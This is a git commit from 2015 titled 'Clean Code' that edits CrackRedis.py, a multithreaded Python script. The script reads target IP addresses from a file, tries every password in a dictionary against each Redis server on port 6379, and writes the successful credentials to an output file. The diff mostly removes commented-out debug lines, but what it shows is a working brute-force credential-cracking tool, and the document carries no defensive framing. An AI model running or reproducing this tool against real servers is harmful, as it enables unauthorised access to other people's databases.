ddf34004456fc462c15d64cf02c8086e1e318dc9
insightglacier <Glacier@insight-labs.org>
2015-12-28 00:25:31 +0800

    Clean Code

--- CrackRedis.py
+++ CrackRedis.py
@@ -17,7 +17,6 @@ class CrackRedisThread(threading.Thread):
     def __init__(self,threadid, q):
         threading.Thread.__init__(self)
         self.tid = threadid
-        #self.name = name
         self.q = q
     def run(self):
         print "Starting " + str(self.tid) + "thread"
@@ -26,20 +25,12 @@ class CrackRedisThread(threading.Thread):
 
 
 def CrackRedis(ip):
-	#print(ip.get())
 	while not exitFlag:
-
-		#print(workQueue)
 		if not workQueue.empty():
-			#print(ip.get())
 			queueLock.acquire()
 			server_addr = ip.get()
 			queueLock.release()
-			#print(server_addr)
-			#queueLock.acquire()
-			#print(server_addr)
 			with open(dicpath) as f:
-				#print("111111")
 				for line in f:
 					pw = line.strip()
 					pw.replace('\n','')
@@ -47,12 +38,10 @@ def CrackRedis(ip):
 					pw = line
 					if(pw=='NULL'):
 						pw = ''
-					#q.put(pw)
 					print(server_addr + ":" + pw)
 					try:
 						r = redis.Redis(host=server_addr, port=6379, db=0,password=pw,socket_timeout=3)
 						db_size=r.dbsize()
-						#print(db_size)
 						print(server_addr + pw + " sucessful")
 						wr.write(server_addr + pw + " sucessful\n")
 						break
@@ -61,39 +50,9 @@ def CrackRedis(ip):
 						pass
 					except :
 						pass
-					#r.close()
 			f.close()
 			ip.task_done()
-		#else:
-		#	break
-			#queueLock.release()
-	        #print "%s processing %s" % (threadName, data)
-	        #time.sleep(1)
 
-'''
-def CrackRedis2(ip):
-
-	with open(dicpath) as f:
-		for line in f:
-			#pw = line.strip()
-			pw = line
-			#q.put(pw)
-			#print(pw)
-			try:
-				r = redis.Redis(host=ip, port=6379, db=0,password=pw,socket_timeout=10)
-				db_size=r.dbsize()
-				#print(db_size)
-				print(pw)
-				#print("sucessful")
-				break
-			except redis.exceptions.ResponseError:
-				print "fail"
-				#pass
-		f.close()
-
-'''
-
-#CrackRedis2('127.0.0.1')
 
 queueLock = threading.Lock()
 workQueue = Queue.Queue(10)
@@ -108,12 +67,11 @@ for i in range(50):
 
 
 # 填充队列
-#queueLock.acquire()
+
 with open(ipfile) as ips:
 	for ip in ips:
 		#print ip
 		workQueue.put(ip)
-#queueLock.release()
 
 # 等待队列清空
 while not workQueue.empty():
